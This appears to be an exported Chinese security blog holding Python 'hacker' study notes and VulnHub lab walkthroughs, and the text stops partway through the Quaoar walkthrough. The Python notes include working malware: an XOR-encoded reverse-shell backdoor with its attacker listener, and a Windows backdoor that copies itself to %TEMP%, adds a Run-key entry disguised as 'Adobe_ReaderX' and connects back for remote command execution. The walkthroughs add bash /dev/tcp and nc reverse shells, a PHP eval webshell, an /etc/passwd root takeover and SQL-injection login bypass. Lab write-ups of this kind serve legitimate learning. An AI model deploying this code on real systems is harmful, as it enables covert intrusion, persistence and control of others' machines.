Response.content.decode()解码为字符格式的网页内容该方法默认参数为&#39;utf-8&#39;，需要根据不同网页进行更改，其他参数有&#39;GBK&#39;，&#39;GB2312&#39;，&#39;GB18030&#39; Response.json()返回Json格式的Response requests.status_code返回响应状态码 内置的状态码查询对象：requests.codes.ok 123html = requests.get(url)html.status_codehtml.status_code == requests.codes.ok multiprocessing模块dummy模块dummy下有一个Pool类，用来实现线程池，线程池下有一个map()方法，可以让线程池里面的所有线程都“同时”执行一个函数 Pool.map()1pool.map(function,iterable) 第一个参数为函数，第二个参数为可迭代的对象：列表、元组、集合、字典 OS模块创建目录os.makedirs()1os.makedirs(&apos;目录名&apos;,exist_ok=True) exis_ok=True当存在相同目录名时，不再创建 os.path.join()1os.path.join(&apos;目录名&apos;,filename+&apos;.后缀名&apos;) python会根据系统环境(Windows,Linux)添加斜杠 os.listdir()1os.listdir(&apos;dir&apos;) 返回列表，列表元素为文件名 os.rename()1os.rename(&apos;原文件名&apos;,&apos;新文件名&apos;) os.system()执行系统命令 和subprocess.Popen()的区别：subprocess可以将执行结果通过STDOUT赋给变量 lxml模块XPath语法1info = selector.xpath(&apos;//div[@class=&quot;useful&quot;]/ul/li/test()&apos;) 直接返回列表，列表中是需要提取的内容 123import lxml.htmlselector = lxml.fromstring(&apos;网页源代码&apos;)info = selector.xpath(&apos;XPath语句&apos;) 获取文本 1//标签1[@属性1=&quot;属性值1&quot;]/标签2[@属性2=&quot;属性值2&quot;]/.../text() 获取属性值 1//标签1[@属性1=&quot;属性值1&quot;]/标签2[@属性2=&quot;属性值2&quot;]/.../@属性n 需要使用独特的标签属性值过滤 属性以某些字符串开头 12//标签[starts-with(@属性名,&quot;相同的开头部分&quot;)]//div[starts-with(@id,&quot;test&quot;)]/test() Python脚本结构12345678910import &lt;moudle1&gt;,&lt;module2&gt;def myFunction(): #自定函数def main():#定义主函数 myFunction()#调用函数 if __name__ == &quot;__main__&quot;:#调用时不会被直接执行 main()#Make a script both importable and executable if __name__ == &quot;__main__&quot;: Python模块都包含内置的变量__name__，当运行模块被直接执行时，__name__等于&quot;__main__&quot;；如果import到其他模块中，则__name__等于模块名称(不包含后缀.py)。 直接运行 12345#test.pyprint(&quot;First&quot;)print (&quot;%s&quot; %(__name__))if __name__ == &quot;__main__&quot;: print (&quot;Second&quot;) 1234//OutputFirst__main__Second 作为模块导入 1234#import_test.pyimport testprint(&quot;======&quot;)print (__name__) 12345//OutputFirsttest======__main_ def __inti__(self,): 在类的方法中，必须有self变量，因为python在调用方法时，会将self作为第一个参数传入方法，若不写self，会出现报错__init__() takes 1 positional argument but 2 were given dir(object) 以列表形式返回对象属性、方法 12345678910111213141516171819202122232425262728#nslookup.pyimport osclass Domain: def __init__(self,domain,port,protocol): self.domain = domain self.port = port self.protocol =protocol def URL(self): if self.protocol == &apos;https&apos;: URL = &apos;https://&apos; + self.domain + &apos;:&apos; + self.port + &apos;/&apos; if self.protocol == &apos;http&apos;: URL = &apos;http://&apos; + self.domain + &apos;:&apos; + self.port + &apos;/&apos; return URL def lookup(self): os.system(&apos;nslookup&apos;+&apos; &apos;+self.domain)def main(): domain = Domain(&apos;www.chirec.github.io&apos;,&apos;80&apos;,&apos;http&apos;) #print(dir(domain)) print(domain.URL()) print(domain.domain) domain.lookup()if __name__ == &quot;__main__&quot;: main() sys模块sys模块可以让Python程序接收参数 12345678#sysExample.pyimport sysscript = sys.argv[0]ip = sys.argv[1]port = sys.argv[2]print(&quot;[+] The script name is: &quot; + script)print(&quot;[+] The IP is:&quot; + ip + &quot; and port is: &quot; + port) socket模块send()报错a bytes-like object is required, not &#39;str&#39;Python2和Python3在套接字返回值解码上有区别string类型可以通过encode()方法编码为指定的bytesbytes类型可以通过decode()方法解码为str，或使用bytes(str,&#39;UTF-8&#39;) 1socket.send(string) 将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。 sendall()1socket.sendall(string) 将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。内部通过递归调用send，将所有内容发送出去。 sendto()1socket.sendto(string,address) 将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。该函数主要用于UDP协议。 connect()连接 1socket.socket.connect((host,port)) close()关闭socket 1socket.socket.close() bind()将套接字绑定到地址。在AF_INET，以元组(host,port)的形式表示地址。 1socket.bind((&apos;host&apos;,port)) listen()开始监听传入连接 1socket.listen(backlog) backlog指定在拒绝连接之前，可以挂起的最大连接数量。 recv()接收套接字的数据。 1socket.recv(bufsize) 数据以字符串形式返回，bufsize指定最多可以接收的数量。 recvfrom()1socket.recvfrom(bufsize) 与recv()类似，但返回值是(data,address)data是包含接收数据的字符串，address是发送数据的套接字地址。 SOCK_STREAM1.数据流2.一般是tcp/ip协议的编程3.有保障的(即能保证数据正确传送到对方)面向连接的SOCKET，多用于资料(如文件)传送 SOCK_DGRAM1.数据包2.udp协议网络编程3.是无保障的面向消息的socket ， 主要用于在网络上发广播信息。 AF_INETIPv4(默认) AF_INET6IPv6 AF_UNIX只能够用于单一的Unix系统进程间通信 异常处理错误由于逻辑或语法导致一个程序无法正常执行的问题 异常程序出错时标识的一种状态 当异常发生时，程序不会再向下执行，而转去调用此函数的地方处理此函数并恢复到正常状态 语法123456789101112131415try: 可以触发异常的语法except 错误类型1 [as 变量1] 异常处理语句1except 错误类型2 [as 变量2]： 异常处理语句2except (错误类型3， 错误类型4): 异常处理语句3...except： 异常处理语句otherelse： 未发生异常语句finally： 最终语句 12345678910111213141516#scanport.pyimport socketports = [21,22,53,80,443,3306,3389]hosts = [&apos;127.0.0.1&apos;]for host in hosts: for port in ports: s = socket.socket() print(&quot;[+] Attempting to connect to &quot;+ host + &quot;:&quot; +str(port)) s.connect((host,port)) banner = s.recv(1024) s.send(&apos;Hello&apos;.encode()) if str(banner): print(&quot;[+]&quot; + host + &quot;:&quot; + str(port) + &quot; open: \\n&quot; + banner.decode()) s.close() 1234567891011121314#udp_server.pyimport sockethost = &apos;127.0.0.1&apos;port = 12600buf_size =128addr = (host,port)udp_server = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)udp_server.bind(addr)while True: print (&apos;waiting for message...&apos;) data,addr = udp_server.recvfrom(buf_size) print (&apos;...received from and return to:&apos; + str(addr) + &quot;: &quot; + data.decode())udp_server.close() 12345678910111213141516#udp_client.pyimport sockethost = &apos;127.0.0.1&apos;port = 12600buf_size = 128addr = (host,port)udp_client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)while True: data = input(&apos;&gt;&apos;) if not data: break udp_client.sendto(data.encode(&apos;utf-8&apos;),addr) data,server_addr = udp_client.recvfrom(buf_size) print (&apos;...received from:&apos; + str(addr) + &quot;: &quot; + data.decode())udp_client.close() 生成exe文件1pip install pyinstall 安装完成之后在Python37/Script文件夹下 1pyinstall.ext --onefile subprocess模块从python2.4版本开始,可以用subprocess这个模块来产生子进程,并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。subprocess意在替代其他几个老的模块或者函数，比如：os.system os.spawn* os.popen* popen2.* commands.* subprocess.Popen()subprocess模块定义了一个类： Popen 1234567891011121314class subprocess.Popen( args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0) 各项参数含义 参数 含义 args 字符串或列表 bufsize 0 无缓冲1行缓冲其他正值缓冲区大小负值采用默认系统缓冲(一般是全缓冲) executable 一般不用，args字符串或列表第一项表示程序名 stdinstdoutstderr None没有任何重定向，继承父进程PIPE创建管道文件对象文件描述符(整数)stderr还可以设置为STDOUT preexec_fn 钩子函数，再fork和exec之间执行。(Unix) close_fds Unix下执行新进程前是否关闭0/1/2之外的文件Windows下不继承还是继承父进程的文件描述符 shell TrueUnix下相当于args前面添加了&quot;/bin/sh&quot; &quot;-c&quot;Windows下相当于添加&quot;cmd.exe /c&quot; cwd 设置工作目录 universal_newlines 各种换行符统一处理为\\n startupinfo Windows下传递给CreateProcess的结构体 creationflags Windows下，传递CREATE_NEW_CONSOLE创建自己的控制台窗口 args:args参数。可以是一个字符串，可以是一个包含程序参数的列表。要执行的程序一般就是这个列表的第一项，或者是字符串本身。subprocess.Popen([&quot;cat&quot;,&quot;test.txt&quot;])subprocess.Popen(&quot;cat test.txt&quot;)这两个之中，后者将不会工作。因为如果是一个字符串的话，必须是程序的路径才可以。(考虑unix的api函数exec，接受的是字符串列表)但是下面的可以工作subprocess.Popen(&quot;cat test.txt&quot;, shell=True)这是因为它相当于subprocess.Popen([&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat test.txt&quot;])在*nix下，当shell=False（默认）时，Popen使用os.execvp()来执行子程序。args一般要是一个【列表】。如果args是个字符串的话，会被当做是可执行文件的路径，这样就不能传入任何参数了。 123456789101112131415161718192021222324#shell.py 攻击者import sockets = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.bind((&apos;192.168.126.1&apos;,12600))s.listen(2048)print (&apos;Listening on port 12600... &apos;)(client,(ip,port)) = s.accept()print (f&apos;received connection from : &#123;ip&#125;&apos;)while True: command = input(&apos;~$ &apos;) # bytearray()需要将str进行编码再byte encode = bytearray(command.encode(&apos;utf-8&apos;)) for i in range(len(encode)): # XOR encode data encode[i] ^= 0x41 client.send(encode) en_data = client.recv(2048) decode = bytearray(en_data) for i in range(len(decode)): decode[i] ^= 0x41 print (decode.decode())client.close()s.close() 12345678910111213141516171819202122232425#backdoor.py 受害者import socket,subprocess,sysRHOST = sys.argv[1]RPORT = 12600s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((RHOST,RPORT))while True: # receive XOR encoded data from network socket data = s.recv(1024) # XOR decoded en_data = bytearray(data) for i in range(len(en_data)): en_data[i] ^= 0x41 # Execute the decoded data as a command # The subprocess module is great because we can PIPE STDOUT/STDERR/STDIN to a variable comm = subprocess.Popen(str(en_data),shell = True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE) comm.wait() STDOUT,STDERR = comm.communicate() print (STDERR) # Encode the output and send to RHOST en_STDOUT = bytearray(STDOUT) for i in range(len(en_STDOUT)): en_STDOUT[i] ^= 0x41 s.send(en_STDOUT)s.close() shell.py运行 backdoor.py运行 optparse模块optparse.OptionParser()1parser = optparse.OptionParser(sys.argv[0] + &apos; &apos; + &apos;-i &lt;file_with URLs&gt; -r -s [optional]&apos;) 未加参数时回显 optparse.add_option()123parser.add_option(&apos;-i&apos;,dest=&apos;domains&apos;,type=&apos;string&apos;,help=&apos;specify target file with URLs&apos;)parser.add_option(&apos;-r&apos;,dest=&apos;directorys&apos;,type=&apos;string&apos;,help=&apos;specify a file with directory to request&apos;)parser.add_option(&apos;-s&apos;,dest=&apos;search&apos;,type=&apos;string&apos;,help=&apos;[optional] Specify a search string -s&apos;) --help显示参数 optparse.parse_args()1(options,args) = parser.parse_args() 返回两个值，options包含所有options的对象，参数作为对象的属性，args解析options后剩余参数的列表 1domains = options.domains optparse.attributesoption.action默认为store option.type默认为string option.dest告诉optparse将参数写在哪里 option.helphelp选项显示内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#fake_dirbuster.pyfrom bs4 import BeautifulSoupimport sys,optparse,socketimport requestsclass Colors: RED = &apos;\\033[91m&apos; GREEN = &apos;\\033[92m&apos;def webreq(domain,directorys): directory = [] with open(directorys,&apos;r&apos;,encoding=&apos;utf-8&apos;) as file: for item in file.readlines(): directory.append(item.strip()) # 移除目录中的换行符 for item in directory: url = domain + &quot;/&quot; + item # 拼接URL html_requested = requests.get(url) # 请求URL if search: parsed = BeautifulSoup(html_requested.content,&apos;lxml&apos;) # Parse the output with BeautifulSoup if search in str(parsed): print (Colors.GREEN + &quot;[+] URL: &quot; + url + &quot; [&quot; + str(html_requested.status_code) + &quot;] Found: &apos;&quot; + search + &quot;&apos; in output&quot;) if html_requested.status_code == 404: print (Colors.RED + &quot;[+] URL: &quot; + url + &quot; [&quot; + str(html_requested.status_code) + &quot;]&quot;) elif html_requested.status_code: print (Colors.GREEN + &quot;[+] URL: &quot; + url + &quot; [&quot; + str(html_requested.status_code) + &quot;]&quot;)def main(): parser = optparse.OptionParser(sys.argv[0] + &apos; &apos; + &apos;-i &lt;file_with URLs&gt; -r -s [optional]&apos;) # 无参数回显 parser.add_option(&apos;-i&apos;,dest=&apos;domains&apos;,type=&apos;string&apos;,help=&apos;specify target file with URLs&apos;) # 设置参数 parser.add_option(&apos;-r&apos;,dest=&apos;directorys&apos;,type=&apos;string&apos;,help=&apos;specify a file with directory to request&apos;) parser.add_option(&apos;-s&apos;,dest=&apos;search&apos;,type=&apos;string&apos;,help=&apos;[optional] Specify a search string -s&apos;) (options,_) = parser.parse_args() domains = options.domains directorys = options.directorys global search search = options.search if (domains == None) and (directorys == None): print (parser.usage) sys.exit(0) if domains: for domain in open(domains,&apos;r&apos;): webreq(domain,directorys)if __name__ == &quot;__main__&quot;: main() cymruwhois模块Client()12345678910from cymruwhois import Clientc = client()google = c.lookup(&apos;8.8.8.8&apos;)type(google)&lt;class &apos;cymruwhois.record&apos;&gt;google.ownergoogle.ipgoogle.ccgoogle.asngoogle.prefix Clien().lookupmany_dict()123#返回字典，索引为ipresult = Client.lookupmany_dict(iplist)result[&apos;8.8.8.8&apos;].owner 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#whois.pyimport sys,os,optparsefrom cymruwhois import Client# whoisdef look(iplist): c = Client() if ips: result = c.lookupmany_dict(iplist) head = &apos;%-20s - %15s (%s) - %s&apos; % (&apos;net&apos;,&apos;ip&apos;,&apos;cc&apos;,&apos;owner&apos;) print (head) for ip in iplist: # get network information net = result[ip].prefix owner = result[ip].owner cc = result[ip].cc info = &apos;%-20s - %15s (%s) - %s&apos; % (net,ip,cc,owner) print (info)# check to ensure file is existed and readabledef checkFile(ips): if not os.path.isfile(ips): print (&apos;[-] &apos; + ips + &apos; does not exist.&apos;) sys.exit(0) if not os.access(ips,os.R_OK): print (&apos;[-]&apos; + ips + &apos; access denied&apos;) sys.exit(0) print (&apos;[+] Querying from: &apos; + ips)def main(): parser = optparse.OptionParser(sys.argv[0] + &apos; -r &lt;file_with IPs&gt; || -i &lt;IP&gt;&apos;) parser.add_option(&apos;-r&apos;,dest = &apos;ips&apos;,type = &apos;string&apos;,help = &apos;specify target IP address&apos;) parser.add_option(&apos;-i&apos;,dest = &apos;ip&apos;,type = &apos;string&apos;,help = &apos;specify a target IP address&apos;) (options,__) = parser.parse_args() ip = options.ip global ips ips = options.ips if (ips == None) and (ip == None): print (parser.usage) sys.exit(0) if ips: checkFile(ips) iplist = [] with open (ips,&apos;r&apos;,encoding=&apos;utf-8&apos;) as file: for line in file.readlines(): iplist.append(line.strip()) look(iplist) else: result = Client().lookup(ip) net = result.prefix owner = result.owner cc = result.cc info = &apos;%-20s - %15s (%s) - %s&apos; % (net,ip,cc,owner) head = &apos;%-20s - %15s (%s) - %s&apos; % (&apos;net&apos;,&apos;ip&apos;,&apos;cc&apos;,&apos;owner&apos;) print (head) print (info)if __name__ == &quot;__main__&quot;: main() 执行系统命令os.system()12import osos.system(&apos;ipconfig&apos;) subprocess.Popen()1234567891011import subprocesscom_str = &apos;ipconfig&apos;command = subprocess.Popen([com_str],stdout = subprocess.PIPE,shell = True)(output,__) = command.communicate()# 解码格式需要尝试 gbk gb2312 utf-8print (output.decode(&apos;gbk&apos;))with open(&apos;file.txt&apos;,&apos;a&apos;,encoding = &apos;utf-8&apos;) as file: file.write(output)with open(&apos;file.txt&apos;,&apos;r&apos;,encoding = &apos;utf-8&apos;) as file: print(file.read()) winreg模块_winreg模块在Python3中被重命名为winreg winreg.OpenKey()打开特定key 12winreg.OpenKey(key,sub_key[,res=0[,sam=KEY_READ]])winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,&apos;SOFTWARE\\Classes&apos;) 返回一个句柄对象key是一个已经打开的键，或任意一个预定义的HKEY_*常量sub_key是一个字符串，表示要打开的子键res为保留整数，必须为0，默认为0sam是一个整数，指定访问掩码，描述密钥的所需安全访问策略 修改键值 1winreg.SetValueEx(key, value_name, reserved, type, value) key是一个已经打开的键，或任意一个预定义的HKEY_*常量value_name是一个字符串，命名了哪一个值与之关联reserved可以使用任何值，0表示总是被传递给APItype是一个整数，描述了数据类型。具体类型参考：Registry Value Typesvalue表示被赋予的新值 1234567891011121314151617181920212223242526272829303132333435363738394041424344import sys,base64,os,socket,subprocessimport winregdef autorun(tempdir,filename,run): # copy file to %TEMP% os.system(&apos;copy %s %s&apos; %(filename,tempdir)) # open reg key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,run) runkey = [] i = 0 while True: subkey = winreg.EnumKey(key,i) runkey.append(subkey[0]) i += 1 if &apos;Adobe ReaderX&apos; not in runkey: key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,run,0,winreg.KEY_ALL_ACCESS) winreg.SetValueEx(key,&apos;Adobe_ReaderX&apos;,0,winreg.REG_SZ,r&quot;%TEMP%mw.exe&quot;) key.close()def shell(): s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&apos;192.168.126.1&apos;,int(12600))) s.send(&apos;[*] Connection Established!&apos;) while True: data = s.recv(1024) if data == &quot;quit&quot;: break proc = subprocess.Popen(data,shell = True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE) stdout_value = proc.stdout.read + proc.stderr.read() encoded = base64.b64encode(stdout_value) s.send(encoded) s.close()def main(): tempdir = &apos;%TEMP%&apos; fileName = sys.argv[0] run = &apos;SoftwareMicrosoftWindowsCurrentVersionRun&apos; autorun(tempdir,fileName,run) shell()if __name__ == &quot;__main__&quot;: main() 参考[1] Python黑客学习笔记：从HelloWorld到编写PoC（上） [2] Python黑客学习笔记：从HelloWorld到编写PoC（中） [3] Python Tutorials [4] python中的subprocess.Popen（）使用","categories":[{"name":"Coding","slug":"Coding","permalink":"https://chirec.github.io/categories/Coding/"}],"tags":[{"name":"Coding","slug":"Coding","permalink":"https://chirec.github.io/tags/Coding/"}]},{"title":"'VulnHub Billu b0x2 Walkthrough'","slug":"VulnHub-Billu-b0x2","date":"2019-05-16T09:06:46.000Z","updated":"2019-07-04T10:16:15.624Z","comments":true,"path":"2019/05/16/VulnHub-Billu-b0x2/","link":"","permalink":"https://chirec.github.io/2019/05/16/VulnHub-Billu-b0x2/","excerpt":"1. GoalMachine Name: - Billu_b0x 2 Author Name: - Manish Kishan Tanwar (@indishell1046) This Virtual machine is using ubuntu (32 bit) Other packages used: - PHP Apache MySQL Apache tomcat This virtual machine is having intermediate to medium difficulty level. One need to break into VM using web application and from there escalate privileges to gain root access. Gaining low or root privilege shell can be done in two ways (for both)","text":"1. GoalMachine Name: - Billu_b0x 2 Author Name: - Manish Kishan Tanwar (@indishell1046) This Virtual machine is using ubuntu (32 bit) Other packages used: - PHP Apache MySQL Apache tomcat This virtual machine is having intermediate to medium difficulty level. One need to break into VM using web application and from there escalate privileges to gain root access. Gaining low or root privilege shell can be done in two ways (for both) 获取低权限和root权限都有两种方法 2. WebNmap 在Nmap扫描结果里可以看到比较重要的2个端口：80和8080 80端口的页面是使用drupal 8搭建的 在exploit db上搜索drupal 8 看到了Metasploit上的EXP，打开Metasploit exploit 成功获得shell 不过作者说有2种方法获得低级shell 3. 渗透方法1修改/etc/passwd 在查看文件时，发现/etc/passwd的权限是777 即使是www-data也有操作权限而且由于/etc/passwd的优先级高于/etc/shadow所以可以修改/etc/passwd文件获取root权限 直接使用vim修改，因为shell的原因无法修改，所以选择上传一个新的passwd文件上去 使用python搭建服务器，下载/etc/passwd，也可以cat/etc/passwd复制内容到本地进行修改 在修改前，需要生成密码，在靶机中使用openssl生成密码 1openssl passwd -1 &apos;chessur&apos; 生成密码后，将root的x替换为密码，或修改indishell用户的密码，并将UID和GID改为0:0拥有root权限 将修改好的passwd文件，先传到Kali的目录中，如/tmp 在meterpreter中上传passwd即可 切换root用户 方法2使用高权限操作提权 寻找带有高权限的文件 1find / -perm -u=s -type f 2&gt;/dev/null 查看文件 12strings s//strings 打印文件中可打印的字符 添加PATH 12345cd /tmpecho &apos;/bin/bash&apos; &gt; /tmp/scpexport PATH=/tmp:$PATHcd /opt./s 4. 总结1./etc/passwd和 /etc/shadow的优先级如果passwd可写，可以把root的密码字段(x)替换成一个已知密码的hash（比如本机shadow里面的root密码hash），这样系统在验证密码时以passwd的为准，密码就已知了。如果shadow可读，我们可以读走root的hash，然后用hashcat或者john暴力破解之。2.使用xshell连接kali获得shell无法退格，而在kali虚拟机中获得shell可以退格3.msf upload4.修改PATH提权：Linux Privilege Escalation Using PATH Variable翻译：在Linux中使用环境变量进行提权Exploiting SUID Executables5.反弹Shell：Reverse Shell Cheat Sheet6.提权前信息收集：Basic Linux Privilege Escalation7.提权：Linux提权：从入门到放弃 5. 参考[1] 渗透Billu b0x2靶机 [2] Hack the billu: b0x 2 VM (Boot to Root)","categories":[{"name":"VulnHub","slug":"VulnHub","permalink":"https://chirec.github.io/categories/VulnHub/"}],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"https://chirec.github.io/tags/VulnHub/"}]},{"title":"'VulnHub Billu b0x Walkthrough'","slug":"VulnHub-Billu-b0x","date":"2019-05-16T03:21:32.000Z","updated":"2019-07-03T01:28:12.510Z","comments":true,"path":"2019/05/16/VulnHub-Billu-b0x/","link":"","permalink":"https://chirec.github.io/2019/05/16/VulnHub-Billu-b0x/","excerpt":"1. GoalThis Virtual machine is using ubuntu (32 bit) Other packages used: - PHP Apache MySQL This virtual machine is having medium difficulty level with tricks. One need to break into VM using web application and from there escalate privileges to gain root access For any query ping me at https://twitter.com/IndiShell1046 Enjoy the machine","text":"1. GoalThis Virtual machine is using ubuntu (32 bit) Other packages used: - PHP Apache MySQL This virtual machine is having medium difficulty level with tricks. One need to break into VM using web application and from there escalate privileges to gain root access For any query ping me at https://twitter.com/IndiShell1046 Enjoy the machine 2. WebNmap 开放22端口和80端口 访问http://192.168.126.163 是个登录页面，Show me your SQLI skills，展示你的SQL注入技巧 用dirbuster和dirb目录扫描，顺便测注入 目录扫描得到很多地址，甚至还有PHPMyadmin的地址 12345678http://192.168.126.163/addhttp://192.168.126.163/chttp://192.168.126.163/headhttp://192.168.126.163/indexhttp://192.168.126.163/panelhttp://192.168.126.163/phpmy/http://192.168.126.163/showhttp://192.168.126.163/test 挨个查看各页面的内容，在test里发现可以传参file 通过POST方式传文件名，可以下载任意文件 将目录扫描获得web页面源码都下载下来 在c.php里找到数据库的用户名、密码billu:b0x_billu，当前数据库 通过PHPMyadmin登录，查看网站数据库ica_lab，找到index.php的登录用户名、密码biLLu:hEx_it 登录之后，跳转到panel.php页面 panel.php源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899&lt;?phpsession_start();include(&apos;c.php&apos;);include(&apos;head2.php&apos;);if(@$_SESSION[&apos;logged&apos;]!=true )&#123; header(&apos;Location: index.php&apos;, true, 302); exit(); &#125;echo &quot;Welcome to billu b0x &quot;;echo &apos;&lt;form method=post style=&quot;margin: 10px 0px 10px 95%;&quot;&gt;&lt;input type=submit name=lg value=Logout&gt;&lt;/form&gt;&apos;;if(isset($_POST[&apos;lg&apos;]))&#123; unset($_SESSION[&apos;logged&apos;]); unset($_SESSION[&apos;admin&apos;]); header(&apos;Location: index.php&apos;, true, 302);&#125;echo &apos;&lt;hr&gt;&lt;br&gt;&apos;;echo &apos;&lt;form method=post&gt;&lt;select name=load&gt; &lt;option value=&quot;show&quot;&gt;Show Users&lt;/option&gt; &lt;option value=&quot;add&quot;&gt;Add User&lt;/option&gt;&lt;/select&gt; &amp;nbsp&lt;input type=submit name=continue value=&quot;continue&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&apos;;if(isset($_POST[&apos;continue&apos;]))&#123; $dir=getcwd(); $choice=str_replace(&apos;./&apos;,&apos;&apos;,$_POST[&apos;load&apos;]); if($choice===&apos;add&apos;) &#123; include($dir.&apos;/&apos;.$choice.&apos;.php&apos;); die(); &#125; if($choice===&apos;show&apos;) &#123; include($dir.&apos;/&apos;.$choice.&apos;.php&apos;); die(); &#125; else &#123; include($dir.&apos;/&apos;.$_POST[&apos;load&apos;]); &#125; &#125;if(isset($_POST[&apos;upload&apos;]))&#123; $name=mysqli_real_escape_string($conn,$_POST[&apos;name&apos;]); $address=mysqli_real_escape_string($conn,$_POST[&apos;address&apos;]); $id=mysqli_real_escape_string($conn,$_POST[&apos;id&apos;]); if(!empty($_FILES[&apos;image&apos;][&apos;name&apos;])) &#123; $iname=mysqli_real_escape_string($conn,$_FILES[&apos;image&apos;][&apos;name&apos;]); $r=pathinfo($_FILES[&apos;image&apos;][&apos;name&apos;],PATHINFO_EXTENSION); $image=array(&apos;jpeg&apos;,&apos;jpg&apos;,&apos;gif&apos;,&apos;png&apos;); if(in_array($r,$image)) &#123; $finfo = @new finfo(FILEINFO_MIME); $filetype = @$finfo-&gt;file($_FILES[&apos;image&apos;][&apos;tmp_name&apos;]); if(preg_match(&apos;/image\\/jpeg/&apos;,$filetype ) || preg_match(&apos;/image\\/png/&apos;,$filetype ) || preg_match(&apos;/image\\/gif/&apos;,$filetype )) &#123; if (move_uploaded_file($_FILES[&apos;image&apos;][&apos;tmp_name&apos;], &apos;uploaded_images/&apos;.$_FILES[&apos;image&apos;][&apos;name&apos;])) &#123; echo &quot;Uploaded successfully &quot;; $update=&apos;insert into users(name,address,image,id) values(\\&apos;&apos;.$name.&apos;\\&apos;,\\&apos;&apos;.$address.&apos;\\&apos;,\\&apos;&apos;.$iname.&apos;\\&apos;, \\&apos;&apos;.$id.&apos;\\&apos;)&apos;; mysqli_query($conn, $update); &#125; &#125; else &#123; echo &quot;&lt;br&gt;i told you dear, only png,jpg and gif file are allowed&quot;; &#125; &#125; else &#123; echo &quot;&lt;br&gt;only png,jpg and gif file are allowed&quot;; &#125;&#125;&#125;?&gt; 页面有2个功能，查看当前用户、添加用户 添加用户时，可以上传图片，格式验证有2次，第一次验证文件后缀名，第二次验证MIME，由于是白名单，无法绕过，只能上传图片马，结合其他代码进行包含 当传入参数continue时，$dir会被通过getcwd()获取当前工作目录，同时第二个传参load会在将./替换为空之后赋给choice 当$choice==&#39;add&#39;时，包含add.php当$choice==&#39;show&#39;时，包含show.php其他情况下，包含load提交文件，此时可以包含之前上传的图片马 包含图片马，可以执行phpinfo();但是无法执行exec之类的命令，用菜刀连接返回200 菜刀不行，换成蚁剑，添加请求头和Body 连接成功 所以为什么不可以在页面直接执行命令。 3.渗透查看权限 刚开始用PHP可以反弹shell，但是主动断掉一次之后，不管用什么方法都返回ret=2，手贱 翻/var/www里的文件，在phpmy里看到配置文件config.inc.php 看到一组密码root:roottoor，试着在PHPMyAdmin登录root用户，但是无法登录，用ssh登录成功 获得root权限 4.总结1.蚁剑相比菜刀，可以配置各种请求头和请求Body，更灵活 2.ret=2不知道是什么情况 3.在页面无法直接执行命令，只能执行个phpinfo，后面重新开了个靶场进行测试，发现是我忘记三个执行系统命令的函数的特性了。exec()是返回最后一个结果，并不显示，需要配合echo来显示，显示效果如下： 单独使用exec() 配合echo使用exec() 可以看到只显示了最后一个用户的信息，也就是最后一个结果 system()和passthru()都显示所有结果 system()显示效果 passthru()显示效果 配合系统命令执行写WebShell(需要写到有可写入可执行权限的文件夹下) 1echo &apos;&lt;?php eval($_POST[Windy]);?&gt;&apos; &gt; uploaded_images/shell.php 4.在前面反弹shell的时候，有个报错Bad fd number之前碰到过一次，但是忘记了，这次又查了一次。是/bin/sh链接到dash，可以更改链接为/bin/bash 5.后面看其他人的WriteUp的时候，学到一个新的发现靶机IP地址的新命令arp-scan -l 6.关于网页反弹Shell，我没有成功，但是在后面看到一个新的反弹姿势 1echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.126.126/6666 0&gt;&amp;1&quot; | bash 需要将payload经过URL编码，而且发送的速度很慢，可能是我电脑性能的问题。反弹之后的shell有个很好玩的效果，输入任何字符都显示两个，若输入ls，显示llss 7.关于登录时的SQL注入，在看过源码之后，觉得无法闭合引号而觉得没有注入的可能，但看了别人的WriteUp之后，发现是可以用万能密码注进去的 1&apos;or 1=1-- -\\&apos; 需要在用户名和密码都填写Payload 5.参考[1] sh: 1: Syntax error: Bad fd number 错误 [2] shell Syntax error: Bad fd number 错误解决 [3] 【随笔】菜刀(代码执行)函数和命令执行函数详解及Getshell方法 [4] VulnHub靶机学习——Billu_b0x实战记录 [5] Billu_b0x渗透实战","categories":[{"name":"VulnHub","slug":"VulnHub","permalink":"https://chirec.github.io/categories/VulnHub/"}],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"https://chirec.github.io/tags/VulnHub/"}]},{"title":"'VulnHub Quaoar Walkthrough'","slug":"VulnHub-Quaoar","date":"2019-05-14T10:28:24.000Z","updated":"2019-07-04T11:25:34.082Z","comments":true,"path":"2019/05/14/VulnHub-Quaoar/","link":"","permalink":"https://chirec.github.io/2019/05/14/VulnHub-Quaoar/","excerpt":"1. Goal","text":"1. Goal 1234567难度：非常简单提示使用工具：namp、dirbuster、nikto、wpscan、hydra有3个flag1.获得Shell2.获得root权限3.在box里有一个后渗透的flag 2. WebNmap robots.txt查看robots.txt robots.txt里有wordpress的目录 访问/wordpress 管理员登录页面&lt;http://192.168.126.162/wordpress/wp-login.php&gt; 弱口令admin:admin登录 修改WordPress模板插入一句话 使用菜刀连WebShell 3. 渗透反弹Shell服务端 1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.126.126 8126 